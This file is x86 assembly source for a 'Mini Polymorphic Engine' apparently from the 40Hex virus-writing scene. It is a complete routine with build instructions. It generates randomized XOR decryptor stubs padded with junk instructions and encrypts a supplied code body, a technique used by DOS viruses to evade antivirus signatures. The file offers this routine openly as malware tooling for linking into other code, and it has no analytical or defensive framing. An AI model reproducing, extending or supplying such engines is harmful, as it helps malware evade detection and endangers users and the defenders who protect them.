; comment *
;                  Mini Polymorphic Engine [MPE] v 0.02
;                             assembly by
;                       KimInWoo/SmartLine/40Hex
; 
;                  Calling parameters:
;                    AL     Flags
;                    CX     Length of plain code
;                    BP     Decryptors offset
;                    DS:SI  Pointer to plain code
;                    ES:DI  Pointer to decryptor + encrypted code
; 
;                  Return parameters:
;                    CX     Length of decryptor + encrypted code
; 
; Flags:
;   xxxxxxx1  Generate junk
;   1111111x  Unused.
; 
; Mini Polymorphic Engine decryptor:
;   Junk Code~
;   MOV BX,imm16; MOV DI,imm16; MOV SI,imm16
;   XOR [BX],imm8; XOR [DI],imm8; XOR [SI],imm8
;   CMP BX,imm16; CMP DI,imm16; CMP SI,imm16
;   JE imm8
;   INC BX; INC DI; INC SI
;   JMP imm16
; 
;  decryptor size:            16 bytes~
; 
; Compile Mini Polymorphic Engine with Turbo Assembler v 4.0 by typing:
;   TASM /M2 MPE.ASM
; 
; *

public       mpe,mpeend,rndget,rndplainget,junkcode

.model tiny
.code

code_begin:
mpe          proc    near
             push    di

             mov     cs:[plain_off],si
             mov     cs:[plain_seg],ds
             mov     cs:[flags],al

             push    cs
             pop     ds

             mov     [plain_length],cx

             mov     ah,02h
             call    rndget
             mov     [random_reg16],al

             call    junkcode
             mov     al,0b8h
             mov     bl,[random_reg16]
             xor     bh,bh
             or      al,[bx+reg16ortable]
             stosb
             mov     [movreg16_off],di
             add     di,02h

gen_decrypt:
             xor     bx,bx
             mov     ax,[bx+decrypttable]

             mov     bl,[random_reg16]
             or      al,[bx+decryptortab]
             xchg    al,ah
             stosw


             call    rndplainget
             mov     [decrypt_key],al
             stosb

             mov     al,81h
             stosb

             mov     al,0f8h
             or      al,[bx+reg16ortable]
             stosb
             mov     [cmpreg16_off],di
             add     di,02h

             mov     al,74h
             stosb
             mov     [je_imm8_off],di
             inc     di
gen_inc_r16:
             mov     ah,01h
             call    rndget
             cmp     al,1
             je      gen_add
             mov     al,40h
             or      al,[bx+reg16ortable]
             stosb
             jmp     gen_jmp_i16
gen_add:
             mov     al,[addcode]
             stosb
             mov     al,[addcode2]
             or      al,[bx+reg16ortable]
             stosb
             mov     al,01h
             stosb

gen_jmp_i16:
             mov     al,0e9h
             stosb

             mov     ax,[movreg16_off]
             sub     ax,di
             stosw
gen_immediat:
             pop     ax
             push    ax
             push    di
             sub     di,ax
             mov     bx,[movreg16_off]
             mov     ax,di
             add     ax,bp
             mov     es:[bx],ax


             mov     ax,di
             add     ax,[plain_length]
             add     ax,bp
             mov     bx,[cmpreg16_off]
             mov     es:[bx],ax

             pop     di

             mov     bx,[je_imm8_off]
             push    di
             sub     di,bx
             dec     di
             xchg    di,bx
             mov     al,bl
             stosb
             pop     di
encrypt_ret:
             mov     al,[decrypt_key]
             mov     [encrypt_key],al
             call    gen_encrypt
             pop     ax
             push    ax
             sub     di,ax
             mov     cx,di
             pop     di

             ret
             endp

gen_encrypt  proc    near

encryptor:
             mov     cx,[plain_length]
             mov     si,word ptr [plain_off]
encrypt:
             lodsb

encrypt_algo db      34h
encrypt_key  db      ?
             stosb

             loop    encrypt

             ret
             endp

junkcode     proc    near
             push    ax
             push    bx
             push    cx
             push    dx
             pushf
             cmp     [flags],00000001b
             jnz     back

             xor     cx,cx
             mov     ax,0502h
             call    rndget
             mov     cl,al
loop_begin:

             mov     ax,0a00h
             call    rndget
             cmp     al,9
             jae     special1
             mov     bx,offset junkcode1
             call    choice
             stosb
             jmp     loopin
choice:
             xor     ah,ah
             add     bx,ax
             sub     bx,1
             mov     ax,[bx]
             xchg    al,ah
             sub     ah,ah
             ret

special1:
             mov     bx,offset junkcode1
             call    choice
             mov     dl,al
             mov     ax,0300h
             call    rndget
             mov     bx,offset junkreg
             call    choice
             or      al,dl
             stosb

loopin:
             loop     loop_begin
back:
             popf
             pop      dx
             pop      cx
             pop      bx
             pop      ax
             ret
             endp


rndget       proc    near
             call    rndplainget

             cmp     al,ah
             ja      rndget

             ret
             endp

rndplainget  proc    near
             in      al,40h

             nop
             ror     al,01h
             db      04h
random       db      ?

             mov     [random],al

             ret
             endp

junkreg      db      000b
             db      001b
             db      010b
             db      101b
junkcode1    db      99h
             db      0fdh
             db      0fah
             db      0fbh
             db      0f8h
             db      0f9h
             db      90h
             db      0d7h
             db      9fh
             db      01000000b
             db      01001000b
decrypttable dw      8030h
addcode      db      10000011b
addcode2     db      11000000b
decryptortab db      00000100b
             db      00000101b
             db      00000111b
reg16ortable db      00000110b
             db      00000111b
             db      00000011b
random_reg16 db      ?
movreg16_off dw      ?
cmpreg16_off dw      ?
je_imm8_off  dw      ?
decrypt_key  db      ?
plain_length dw      ?
plain_off    dw      ?
plain_seg    dw      ?
flags        db      ?

mpeend       equ     $
code_end:

end          code_begin
